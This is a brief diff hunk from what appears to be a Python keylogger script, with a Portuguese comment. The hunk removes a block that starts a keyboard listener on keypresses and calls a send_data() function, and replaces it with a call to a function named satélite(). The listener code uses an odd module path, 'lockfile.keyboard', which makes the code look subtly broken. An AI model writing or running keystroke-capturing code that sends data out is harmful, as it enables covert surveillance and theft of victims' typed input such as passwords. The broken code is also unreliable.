@@ -90,9 +90,5 @@ def send_data():
     except Exception as e:
         print(e)
 
-with lockfile.keyboard.Listener(on_press=process_keypress) as listener:
-    send_data()
-    listener.join()
-
-# Call the function to execute satélite
+# Chamar a função satélite ao invés de usar o listener diretamente
 satélite()
